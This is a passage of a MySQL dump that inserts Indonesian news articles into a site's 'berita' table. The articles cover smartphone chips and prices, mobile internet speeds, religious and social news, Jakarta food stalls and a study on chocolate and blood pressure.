'iphone_mstore_indonesia_jadi_kunci1.jpg', 12, 'teknologi', 'Y');
INSERT INTO `berita` (`id_berita`, `id_kategori`, `username`, `judul`, `sub_judul`, `youtube`, `judul_seo`, `headline`, `aktif`, `utama`, `isi_berita`, `keterangan_gambar`, `hari`, `tanggal`, `jam`, `gambar`, `dibaca`, `tag`, `status`) VALUES
(604, 19, 'admin', 'Xiaomi Dikabarkan Gandeng MediaTek untuk Bikin Chip Smartphone Sendiri', '', 'https://www.youtube.com/watch?v=Wx7Y8wYai9M', 'xiaomi-dikabarkan-gandeng-mediatek-untuk-bikin-chip-smartphone-sendiri', 'Y', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id -&nbsp; Xiaomi dikenal menggunakan&nbsp;System-on- Chip buatan MediaTek di sejumlah produk&nbsp;smartphone&nbsp;besutannya. Ke depan, dua pabrikan ini kemungkinan bakal mempererat kemitraannya dengan bekerja sama membuat&nbsp; chip&nbsp;untuk ponsel. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Menurut kabar yang beredar dari media sosial Weibo di China, Xiaomi dan MediaTek belakangan memang semakin \"mesra\". Keduanya dirumorkan sedang menyiapkan sebuah&nbsp;chip custom&nbsp;untuk disematkan di ponsel buatan Xiaomi. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sebelumnya, ponsel Xiaomi beberapa kali menjadi produk pertama yang mengusung chip baru dari MediaTek. Misalnya saja Redmi Note 8 Pro keluaran 2019 yang sekaligus menandai debut chip Helio G90T buatan MediaTek. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kemudian Redmi 10X menjadi ponsel pertama yang mengedepankan SoC Dimensity 820. Tahun ini pun, chip Dimensity 1000+ dari MediaTek disinyalir bakal hadir di smartphone Redmi.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Jadi, mungkin tak aneh kalau Xiaomi dan MediaTek bergandeng tangan mengembangkan chip smartphone, meskipun kabar ini belum tentu benar, sebagaimana dihimpun KompasTekno dari GizChina, Senin (6/7/2020). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kenapa Xiaomi ingin mengembangkan chip ponsel sendiri? Salah satu faktor motivasinya diduga berkaitan dengan nasib Huawei yang menjadi kesulitan setelah namanya dimasukkan daftar hitam entity list oleh pemerintah AS. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Bukan hanya tak dibolehkan memasang layanan dan aplikasi Google di ponsel, Huawei pun dijegal oleh AS dalam persoalan manufaktur chip buatannya di pabrik Taiwan Semiconductor Manufacturing Company. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dengan membuat chip sendiri, Xiaomi disinyalir bisa mengurangi ketergantungan terhadap perusahaan AS, seperti Qualcomm yang produk chip Snapdragon buatannya banyak dipakai di ponsel China.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>', 'Xiaomi Dikabarkan Gandeng MediaTek untuk Bikin Chip Smartphone Sendiri, Makin Ganas saja yaa!', 'Minggu', '2020-07-07', '14:37:05', 'mediatek_mstore_indonesia_xiamo.jpg', 14, 'teknologi', 'Y'),
(605, 39, 'admin', 'Rata-rata Kecepatan Download Seluler di Indonesia 14 Mbps', '', 'https://youtu.be/TfwX2TZqSng', 'ratarata-kecepatan-download-seluler-di-indonesia-14-mbps', 'Y', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id -&nbsp; Facebook memaparkan Indeks Internet Inklusif tahun 2020 berdasarkan hasil riset yang dirilis oleh The Economist Intelligence Unit (EIU).</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Berdasarkan data, kecepatan internet seluler di Indonesia lebih lambat daripada rata-rata kecepatan internet seluler di negara Asia. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Kecepatan download seluler di Indonesia menurut riset EIU adalah 14 Mbps. Sementara angka kecepatan download rata-rata negara Asia adalah di angka 30,9 Mbps.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Sementara untuk kecepatan rata-rata upload di Indonesia adalah 10,9 Mbps, mendekati kecepatan upload rata-rata Asia yang mencapai 12,9 Mbps. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski begitu, penetrasi internet mobile 4G di Indonesia menurut riset tersebut sudah cukup luas. Sebanyak 92,7 persen pengguna internet di Indonesia disebut sudah terjangkau oleh jaringan seluler 4G.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sedangkan untuk jaringan 3G dan 2G, cakupan masing-masing adalah 93,4 persen dan 98,7 persen.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">\"Cakupan layanan 4G ini sangat mengesankan, mengingat geografi Indonesia merupakan negara kepulauan yang cukup luas,\" ujar Karissa Sjawaldy, Public Policy Associate Manager Facebook Indonesia. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>Indeks ke-57 </b></span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Secara keseluruhan, kondisi internet di Indonesia berada di posisi ke-57 dari 100 negara yang masuk dalam daftar Indeks Internet Inklusif tahun 2020 tersebut.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Indeks Internet Inklusif sendiri merupakan tolak ukur yang memperhitungkan tingkat cakupan koneksi internet berdasarkan penilaian dari empat kategori yaitu Ketersediaan, Keterjangkauan, Relevansi, dan Kesiapan.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam hal ketersediaan, kategori ini mengukur apakah suatu negara dapat mengakses internet dengan baik atau tidak.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Dalam hal keterjangkauan, indikator ini mengukur apakah individu di suatu negara mampu menggunakan layanan internet secara baik. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Sedangkan dari segi kesiapan, kategori ini&nbsp; mengukur apakah individu di suatu negara mengetahui cara menggunakan layanan internet dengan baik serta mengukur tingkat literasi digital perorangan.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"> Untuk segi relevansi, kategori Relevansi melihat apakah dengan mengakses internet, suatu individu di suatu negara dapat menemukan konten yang relevan dengan minat mereka masing-masing. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam hal keterjangkauan, Indonesia menempati peringkat ke-61, artinya internet di Tanah Air masih dinilai cukup terjangkau dibandingkan negara lain seperti Kamboja (71) dan Filipina (82). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Terkait dengan ketersediaan internet, Indonesia menduduki posisi ke-55 yaitu peringkat di atas India (68) dan Pakistan (86), artinya ketersediaan koneksi internet di Tanah Air dinilai sudah cukup memadai secara luas.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dalam hal relevansi, Indonesia berada di peringkat ke-62 yaitu satu peringkat di atas Uzbekistan (63). Peringkat tersebut mengalami peningkatan 7 persen dibandingkan tahun sebelumnya. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Dari segi kesiapan, Indonesia menduduki posisi ke-40. Hal itu menandakan bahwa sebagian masyarakat sudah memahami bagaimana cara memanfaatkan layanan internet secara baik.</span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><br></span><br></p>\r\n', 'Rata-rata Kecepatan Download Seluler di Indonesia Baru Mencapai 14 Mbps', 'Minggu', '2020-07-07', '13:24:45', 'internet_mstore_indonesia.jpg', 12, 'palestina', 'Y'),
(606, 42, 'admin', 'Astagfirullah, Festival Wine Digelar di Halaman Masjid ', '', '', 'astagfirullah-festival-wine-digelar-di-halaman-masjid-', 'N', 'N', 'N', '<p>Beer El-Sabe - Kelompok Muslim menyatakan kemarahannya atas rencana penyelenggaraan Festival Wine di kota Beer el-Sabe, Israel. Kemarahan karena, penyelenggaraan akan dilaksanakan di halaman luar sebuah bangunan bekas masjid kuno di wilayah tersebut.<br />\r\n<br />\r\nMenurut laporan media Israel, Gerakan Islam di Israel mengatakan festival ini merupakan &quot;dosa tak termaafkan&quot;. Festival juga dianggap sebagai pukulan keras bagi umat Muslim di sana Sebab menurut kelompok Muslim tersebut, publisitas festival anggur merupakan penghinaan terhadap sensitivitas Muslim. Seperti diketahui Islam melarang konsumsi alkohol.<br />\r\n<br />\r\nFestival &quot;Salut Wine dan Beer Festival&quot; ke enam ini rencananya akan diselenggarakan di pelataran sebuah bangunan bekas masjid di Beer el-Sabe, pada 5-6 September. Festival akan menampilkan minuman beralkohol dari sekitar 30 pabrik dan perkebunan anggur di seluruh negeri.<br />\r\n<br />\r\nPusat Hukum untuk Hak Minoritas Arab di Israel, Kamis (16/8) lalu, mengirimkan surat pada Jaksa Agung, Menteri Kebudayaan dan Olahraga Israel serta Kotamadya Beer el-Sabe. Mereka menuntut agar festival Wine di wilayah tersebut dibatalkan. &quot; Penggunaan pelataran Masjid untuk festival minuman beralkohol adalah sesuatu yang sensitif. Sebab Islam melarang konsumsi alkohol dan tak sesuai dengan penggunaan masjid untuk beribadah,&quot; tulis organisasi tersebut dalam surat ke Jaksa Aram Mahameed.<br />\r\n<br />\r\nSurat juga menambahkan, Festival Wine melanggar keputusan Mahkamah Agung Israel yang keluar Juni 2011 lalu. Dalam keputusan tersebut memerintahkan masjid untuk diubah menjadi museum sejarah dan kebudayaan Islam.<br />\r\n<br />\r\nMasjid yang dibangun pada Era Usmani pada 1906 ini sempat menjadi tempat ibadah hingga 1948. Kemudian berubah menjadi penjara dan pengadilan hingga 1952. Lalu dari 1953-1991 dibuka sebagai Museum Tanah Negeb. Pada 2002 sempat ada sebuah petisi yang meminta masjid untuk dibuka kembali sebagai tempat ibadah.</p>\r\n', '', 'Minggu', '2018-04-22', '07:54:00', 'wine.png', 40, '', 'Y'),
(607, 47, 'admin', 'Moskow Larang Parade Selama 100 Tahun', '', '', 'moskow-larang-parade-selama-100-tahun', 'Y', 'Y', 'N', '<p>Pengadilan di Moskow mengukuhkan keputusan untuk melarang parade homoseksual untuk seratus tahun ke depan.<br />\r\n<br />\r\nLangkah ini dilakukan menyusul upaya pegiat hak homoseksual Rusia, Nikolay Alexeyev untuk membatalkan keputusan pemerintah kota melarang parade.<br />\r\n<br />\r\nIa meminta hak melakukan parade selama 100 tahun ke depan.<br />\r\n<br />\r\nAlexeyev juga menentang larangan kota St Petersburgh untuk menyebarkan &quot;propaganda homoseksual.&quot;</p>\r\n\r\n<p>Mahkamah hak asasi Eropa telah meminta pemerintah Rusia untuk membayar kerugian kepada Alexeyev.</p>\r\n\r\n<p>Alexeyev mengatakan Jumat (17/08) ia akan kembali ke Mahkamah Eropa untuk meminta agar menetapkan bahwa larangan itu tidak adil.</p>\r\n\r\n<p>Pemerintah kota Moskow menyatakan parade gay akan menimbulkan risiko gangguan ketertiban umum.</p>\r\n\r\n<p>Pemkot juga mengatakan sebagian besar warga Moskow menentang kegiatan itu.</p>\r\n\r\n<p>Bulan September lalu, Dewan Eropa -pengawasan HAM di Eropa- akan meneliti tanggapan Rusia atas keputusan Mahkamah Eropa sebelumnya tentang hak gay, menurut media Rusia.</p>\r\n\r\n<p>Bulan Oktober 2010, Mahkamah Eropa mengatakan Rusia melakukan diskriminasi terhadap Alexeyev karena orientasi seksualnya.</p>\r\n\r\n<p>Mahkamah saat itu menangani larangan Moskow atas parade gay antara tahun 2006-2008.</p>\r\n', 'Nikolay Alexeye. ', 'Minggu', '2018-04-22', '07:20:38', 'moscow.jpg', 3, 'internasional', 'Y'),
(597, 44, 'admin', 'Pasar Tiban Kalibata Selalu Ramai Pengunjung', '', '', 'pasar-tiban-kalibata-selalu-ramai-pengunjung', 'Y', 'Y', 'N', 'Jakarta - Pasar tiban, atau pasar musiman, istilah untuk menjelaskan pasar yang musiman, tidak punya tempat menetap. Ada juga istilah pasar malam, pasar tumpah atau pasar kaget. Biasanya pasar ini mengambil waktu tertentu misalnya: bulan puasa, atau hari tertentu yang libur. Pasar tiban di Kalibata &lsquo;buka&rsquo; tiap hari minggu.<br />\r\n<br />\r\nBermacam-macam barang dijajakan, mulai dari pakaian, mainan anak-anak, sepatu, tas, tanaman hias, jajan pasar, peralatan rumah tanggga, sprei, parfum, buku dan majalah bekas, pigura, dll. Semua dengan harga murah. Pasar ini mengambil tempat sepanjang jalan dari menuju Stasiun Kalibata sampai depan STEKPI, samping periumahan DPR RI Kalibata.<br />\r\n<br />\r\nPasar ini awalnya tidak begitu ramai. Waktu itu setiap hari minggu di danau Taman Makam pahlawan (TMP) Kalibata banyak orang yang melakukan olah raga pagi. Muda-mudi paling banyak. Hukum ekonomi berjalan, di mana ada keramaian selalu ada yang menggunakan peluang. Maka ada orang jualan bubur ayam, lontong sayur, ketoprak dan lainnya. Mengambil tempat sempit di depan gerbang parkir TMP.<br />\r\n<br />\r\nLama-lama ada yang berjualan pakaian, mainan, poster, dan lainnya. Semakin banyak yang berjualan dan mengambil tempat di sepanjang jalan depan TMP. Di sini mulai ada masalah, kemacetan. Mungkin karena pengunjung semakin banyak, membuat kemacetan, pasar &lsquo;dipindah&rsquo; ke dalam. Hingga sekarang. Sebenarnya tidak tahu dipindah atau pindah sendiri, mungkin pihak berwenang berprinsip, yang penting tidak mebuat jalan macet.<br />\r\n<br />\r\nJadilah seperti sekarang, pasar tiban menjadi hiburan sendiri untuk warga Kalibata, Pancoran, Pasar minggu dan sekitarnya. Tempatnya yang relatif jauh dari jalan raya, masih hijau, memang enak buat jalan-jalan. Setelah lelah jalan-jalan melihat-lihat barang, tersedia berbagai warung yang meyediakan berbagai menu, tinggal pilih: Nasi uduk, lontong sayur, nasi rames, mendowan, bubur ayam, pecel lele, warung Padang, warung Sunda. Juga minuman, ada es tebu, Es Teh, es buah.<br />\r\n<br />\r\nPenasaran, sempatkan hari muingggu ke Kalibata. Tersedia angkutan dari berbagai arah: Dari Blok M, naik Kopaja 57, Dari Cililitan kopaja 57/ Metrimini 64, dari Kampung melayu dan Pasar Minggu naik M16, dari Manggarai naik Metromini 62. Jangan lupa ajak keluarga, sekalian makan bersama di hari Minggu.<br />\r\n', '', 'Minggu', '2012-08-19', '01:54:07', '', 37, 'wisata', 'Y'),
(627, 40, 'admin', 'Nikmatnya Bubur Ayam Cikini yang membuat ketagihan', '', '', 'nikmatnya-bubur-ayam-cikini-yang-membuat-ketagihan', 'N', 'N', 'N', '<p>Jakarta - Jika Anda pecinta kuliner Bubur, pasti sudah mengenal Bubur Cikini H. Sulaiman. Bubur yang satu ini memang terbilang populer di Jakarta. Kabarnya bubur ini didirikan sejak tahun 1980-an. Bisa bertahan sampai sekarang tentu merupakan jaminan tersendiri. Kualitas rasa adalah modal utama sebuah usaha kuliner selalu diterima konsumen. Bubur Cikini H. Sulaiman memiliki hal tersebut.<br />\r\n<br />\r\nDahulu Bubur Cikini H. Sulaiman bisa dijumpai di tenda kaki lima. Jam operasional juga dimulai sekitar jam 6 sore hari. Namun kini Bubur Cikini H. Sulaiman telah memiliki tempat permanen yang lebih nyaman. Jam operasional juga berubah. Kini Bubur Cikini juga bisa dinikmati di pagi hari. Bagi yang suka menu bubur untuk sarapan, jangan sampai melewatkan Bubur Cikini.<br />\r\n<br />\r\nSoal menu, Bubur Cikini H. Sulaiman tentu menyajikan menu bubur sebagai sajian utama. Menu yang bisa dicicipi antara lain Bubur Ayam Biasa, Bubur Ayam Telur, Nasi Goreng Ayam, Nasi Goreng Otokwok, Mie Goreng/Rebus, Telur Goreng, Empal Gentong Nasi/Lontong, Ati Ampela, aneka minuman dan masih banyak lagi lainnya. Jika Ingin menikmati empal Gentong Nasi/Lontong harus datang di hari Sabtu atau Minggu sebab menu tersebut tidak tersedia setiap harinya.<br />\r\n<br />\r\nSoal harga memang fluktuatif. Bisa berubah kapanpun. Tetapi sebagai deskripsi harga, seporsi Bubur Ayam Biasa bisa dinikmati dengan harga Rp.13.000 per porsi, menu Bubur Telur juga di harga yang sama. Untuk Nasi Goreng Ayam bisa dinikmati dengan membayar Rp.15.000, sedangkan Nasi Goreng Otokwok bisa dinikmati dengan harga Rp,17.000. Bagi yang menyukai menu Empal Gentong Nasi/Lontong bisa dicicipi dengan membayar Rp.20.000 per porsi. Cukup murah!</p>\r\n', '', 'Selasa', '2012-08-21', '13:55:20', '', 11, '', 'Y'),
(628, 44, 'admin', 'Soto Betawi H. Husein sangat enak sekali', '', '', 'soto-betawi-h-husein-sangat-enak-sekali', 'N', 'N', 'N', '<p>Indonesia sangat kaya akan khazanah kuliner. Masing-masing wilayah mempunyai makanan yang khas. Meskipun sama jenisnya, namun rasa dan racikannya berbeda.<br />\r\nSama seperti daerah-daerah lain di Indonesia, masyarakat Betawi juga mempunyai makanan khas yaitu soto Betawi. Salah satu yang terkenal adalah soto Betawi Haji Husein yang ada di kawasan Minangkabau, Manggarai, Jakarta Selatan. Di tempat seluas 5 x 10 meter, Bang Husein, 57; panggilan akrabnya, membuka usahanya dari pukul 07.00 WIB hingga dagangannya habis. Usaha ini telah dirintisnya sejak tahun 1989. Sebelum membuka usaha sendiri, ia terlebih dahulu belajar dari pamannya sejak tahun 1970-an.<br />\r\n<br />\r\nSaya sudah mulai ikut usaha sejak Kelas 4 SD. Waktu itu ikut Uwak (panggilan paman-Red) jualan sate, tongseng, sama soto, kata Bang Husein. Bapak empat orang anak ini mengaku memilih soto karena lebih praktis, selain itu ia ingin melestarikan makanan asli Betawi.<br />\r\nYang membedakan soto Betawi Haji Husein dengan soto di daerah lainnya adalah proses pengolahan isi sotonya. Olahan daging sapi yang berupa daging, jeroan, dan kikil terlebih dahulu direbus; baru kemudian digoreng. Yang hampir sama biasanya soto Makassar, cuma biasanya dagingnya direbus saja, nggak digoreng, ujar pria kelahiran Jakarta ini.<br />\r\nDalam sehari Bang Husein biasa menyediakan 50 Kg olahan daging sapi yang terdiri dari daging, jeroan, dan kikil. Mulai pukul 03.00 WIB ia merebus semuanya hingga pukul 06.00 WIB. Menurutnya proses merebus membutuhkan waktu yang cukup lama. Bumbu yang digunakan untuk kuah sotonya hanya terdiri dari rempah-rempah biasa yang banyak dijual di pasar. Bahan-bahan itu kemudian diracik sedemikian rupa sehingga mempunyai rasa yang khas. Kuah soto Betawi umumnya kental karena menggunakan santan. Dalam sehari ia bisa menghabiskan berpuluh butir kelapa tua untuk diolah menjadi santan.<br />\r\n<br />\r\nSetiap hari warungnya selalu ramai dikunjungi orang. Biasanya mereka datang pada saat jam istirahat makan siang. Penikmat soto Haji Husein berasal dari berbagai kalangan. Mulai dari yang berkantong tipis sampai yang berkantong tebal. Demikian lakunya, tidak jarang pelanggannya harus antre menunggu pelanggan lain yang sedang makan.<br />\r\nTempatnya yang terletak persis di pinggir jalan terkadang tidak muat menampung sepeda motor dan mobil yang dikendarai para pelanggannya. Tak jarang pula orang-orang kantoran datang jauh-jauh hanya untuk merasakan kenikmatan sotonya.<br />\r\n<br />\r\nMelihat banyaknya pengunjung yang datang, bisa dipastikan rasanya pastilah menggugah selera. Dalam sehari Bang Husein mengaku bisa menghabiskan lebih kurang 100 porsi. Untuk satu porsinya ia hargai Rp16.000, itu sudah termasuk nasi. Omzet per-bulannya bisa mencapai lebih kurang Rp20 juta. Ke-12 orang karyawan kini membantunya melayani pelanggan setiap hari. Waktu awal buka mah cuma berdua. Sekarang pegawainya nggak pernah berubah, ungkapnya. Di antara karyawannya ada dua anak lelakinya yang ikut membantu.<br />\r\nUsaha ini merupakan usaha keluarga turun-temurun. Bang Husein merupakan generasi keempat. Sebelum di tempatnya saat ini ia sempat merasakan berjualan keliling menggunakan pikulan.<br />\r\n<br />\r\nUang Rp400.000 menjadi modal awal usahanya. Dulu uang segitu besar, bisa buat beli semua, katanya. Usaha ini dijalaninya mulai dari bawah sekali. Bahan-bahan sotonya didapatkan dengan cara mengutang. Ia juga harus membayar sewa tempat.<br />\r\nSaat ini dengan omzet besar ia tidak perlu lagi mengutang. Bahkan sejak tahun 2000 tempatnyapun sudah menjadi milik pribadi. Asal ada kemauan, semua pasti bisa. Yang penting jangan pernah bosan kalau usaha, ujarnya. Untuk mempertahankan cita-rasa agar tidak berubah, Bang Husein selalu memerhatikan takaran komposisinya. Hal inilah yang menjadi salah satu daya tarik pengunjung untuk kembali karena rasa tidak berubah-ubah.<br />\r\n<br />\r\nMeski sudah menjadi pemilik, kakek dua orang cucu ini masih melayani sendiri para pelanggannya. Ia tidak canggung berbaur dengan karyawan lainnya. Ini juga menjadi salah satu trik untuk menarik pelanggannya. Terkadang para pelanggan yang seumurnya apabila dilayani olehnya akan merasa senang. Menurut mereka liat muka kita aja udah enak, makanan nomer dua, katanya sambil tertawa. Pertemuan seperti ini seperti sebuah nostalgia baginya.<br />\r\nSemua jerih payahnya telah membuahkan hasil yang cukup membanggakan baginya. Dari hasilnya berjualan ia sudah bisa pergi haji dan membiayai anak-anaknya sekolah. Ia juga sudah memberangkatkan dua karyawannya untuk menunaikan ibadah haji. Soto Betawi Bang Husein buka dari Senin sampai Minggu. Khusus hari Jumat ia sengaja tidak membuka warungnya untuk ibadah sholat Jumat. Pada bulan Ramadhan ia juga menutup usahanya sebulan penuh.<br />\r\n<br />\r\nInilah Bang Husein, usahanya dijalani secara seimbang dengan ibadah. Ia juga tidak sungkan membagi rahasia dapurnya. Rezeki mah ada aja, udah ada yang ngatur. Selain usaha juga jangan lupa berdoa, ujarnya.</p>\r\n', '', 'Selasa', '2012-08-21', '14:35:48', '', 8, '', 'Y'),
(629, 31, 'admin', 'Cokelat Hitam Turunkan Tekanan Darah', '', '', 'cokelat-hitam-turunkan-tekanan-darah', 'N', 'N', 'N', '<p>Cokelat hitam sudah lama diketahui manfaatnya bagi kesehatan. Hasil analisa terhadap 20 studi menunjukkan, konsumsi cokelat hitam setiap hari akan menurunkan tekanan darah.<br />\r\n<br />\r\nPenelitian yang dilakukan The Cochrane Group melaporkan, zat aktif dalam cokelat bermanfaat untuk membuat pembuluh darah lebih rileks. Akibatnya, tekanan darah pun turun.<br />\r\n<br />\r\nZat aktif yang punya efek positif tersebut adalah flavonol, yang di dalam tubuh akan menghasilkan zat kimia oksida nitrat dan membuat pembuluh darah lemas sehingga darah lebih lancar bersirkulasi.<br />\r\n<br />\r\nAnalisis yang dibuat tersebut mengombinasikan beberapa penelitian sebelumnya untuk mengetahui ada tidaknya efek cokelat bagi tekanan darah. Cokelat hitam yang dikonsumsi partisipan dalam penelitian itu cukup banyak, antara 3 gram sampai 105 gram setiap hari.<br />\r\n<br />\r\nNamun penurunan tekanan darah yang dihasilkan tidak terlalu besar, hanya 2-3 mmHg. Akan tetapi penelitian hanya dilakukan selama dua minggu sehingga tidak diketahui dampaknya dalam jangka panjang.<br />\r\n<br />\r\n&quot;Meski kami belum mendapat bukti adanya efek jangka panjang penurunan tekanan darah, tetapi penurunan sedikit dalam jangka pendek ini mungkin dalam jangka panjang bisa berkontribusi pada penurunan risiko penyakit jantung,&quot; kata Karin Ried, dari National Institute of Integrative Medicine di Melbourne, Australia.<br />\r\n<br />\r\nTekanan darah tinggi cukup banyak diderita dan diperkirakan menjadi penyebab terbanyak stroke dan penyakit jantung.<br />\r\n<br />\r\nBila Anda ingin mendapatkan manfaat dari cokelat hitam, sebaiknya pastikan produk yang dibeli mengandung cokelat dalam jumlah tinggi karena kebanyakan produk di pasaran lebih banyak kandungan gula dan lemaknya.<br />\r\n<br />\r\nSelain cokelat, kacang, aprikot, blackberries, dan apel juga mengandung flavonol meski kadarnya lebih rendah daripada cokelat.</p>\r\n', '', 'Minggu', '2018-04-22', '07:34:00', 'coklat-hitam.jpg', 4, 'kesehatan', 'Y'),
(630, 36, 'admin', 'Bos Yahoo Bajak 2 Karyawan Google tahun 2018', '', '', 'bos-yahoo-bajak-2-karyawan-google-tahun-2018', 'N', 'N', 'N', '<p>Marissa Mayer, sang CEO Yahoo kembali memperkuat &#39;pasukannya&#39;. Pernah bernaung di bawah bendera Google, Mayer pun membajak dua karyawan dari kantor terdahulunya tersebut.<br />\r\n<br />\r\nWanita yang diangkat menjadi CEO perusahaan internet pada bulan Juli lalu ini telah mempekerjakan mantan<em> Product Marketing Manager</em> Google yang bernama Andrew Schulte. Ia kini menjadi kepala staff di tubuh Yahoo.<br />\r\n<br />\r\nSchulte bergabung dengan Google pada tahun 2007. Ia sempat menangani kampanye marketing Google+. Penegasan kepindahan dirinya ia tuliskan di akun Twitter maupun profil LinkedInnya.<br />\r\n<br />\r\nSebelum Schulte, Mayer sudah membajak Anne Espiritu di mana duluanya bekerja sebagai<em> consumer technology PR </em>di Google, demikian dikutip dari <em>Cnet</em>, Senin (20/8/2012).<br />\r\n<br />\r\nMayer memang tengah sibuk menata struktur manajemen Yahoo. Perusahaan ini kabarnya juga tengah berburu <em>Chief Operating Officer </em>(COO) dengan pengalaman di bidang manajemen finansial dan restrukturisasi perusahaan.</p>\r\n', '', 'Minggu', '2018-04-22', '11:05:22', 'Marissa_Mayer.jpg', 10, 'teknologi', 'Y'),
(631, 19, 'admin', 'Honor 30 Lite dan Honor X10 Max Resmi Meluncur, Ini Harganya', '', 'https://www.youtube.com/watch?v=irofuKpd2jE', 'honor-30-lite-dan-honor-x10-max-resmi-meluncur-ini-harganya', 'N', 'N', 'N', '<p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">MSTORE.co.id - Honor meluncurkan duo ponsel mid-range terbarunya yakni Honor 30 Lite dan Honor X10 Max di negara asalnya, China. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski hadir dari keluarga yang berbeda, kedua perangkat tersebut dipersenjatai dengan otak yang sama, yakni chipset Mediatek Dimensity 800. Chipset ini mendukung konektivitas 5G dan teknologi pengisian cepat dengan daya 22,5 watt. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Tak hanya itu, Honor X10 Max dan 30 Lite juga mengusung bahasa desain yang serupa. Bagian depan kedua ponsel tersebut, misalnya, kompak dihiasi dengan poni berbentuk tetesan air (waterdrop) yang memuat kamera selfie. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Bagian punggung kedua ponsel juga ditempeli dengan sejumlah modul kamera yang ditampung dalam modul persegi. Lantas, apa perbedaannya?</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Seperti namanya, Honor X10 Max memiliki ukuran layar yang besar. Ponsel ini dibekali dengan layar 7,09 inci beresolusi Full HD Plus. Refresh rate-nya masih mentok di 60 Hz </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ada tiga kamera yang tersemat di ponsel ini, terdiri dari dua kamera belakang beresolusi 48 MP dan 2 MP (depth sensor), serta satu kamera depan dengan resolusi 8 MP. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Chipset MediaTek Dimensity 800 yang ditanamkan dalam ponsel ini, didampingi RAM hingga 8 GB serta memori internal dengan kapasitas 128 GB. Baterainya memiliki kapasitas 5.000 mAh. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Ponsel ini sudah mendukung pengisi daya cepat 22,5W. Untuk sektor keamanan, Honor X10 Max dibekali pemindai sidik jari yang ditempatkan di sisi kanan.</span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Di China, Honor X10 Max hadir dalam warna hitam, biru, dan silver. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Harganya dipatok di angka 1.899 yuan (6 GB/64 GB, Rp 3,8 juta), 2.099 yuan (6 GB/128 GB, Rp 4,2 juta), dan 2.499 yuan (8 GB/128 GB, Rp 5 juta). </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\"><b>Honor 30 Lite </b></span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Berbeda dengan Honor X10 Max, Honor 30 Lite memiliki layar yang ukurannya sedikit lebih kecil, yakni 6,5 inci dengan resolusi Full HD Plus. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 14px;\">Meski demikian, layar ponsel ini memiliki refresh rate di angka 90 Hz. </span></p><p><span style=\"color: rgb(42, 42, 42); font-family: Roboto, sans-serif; font-size: 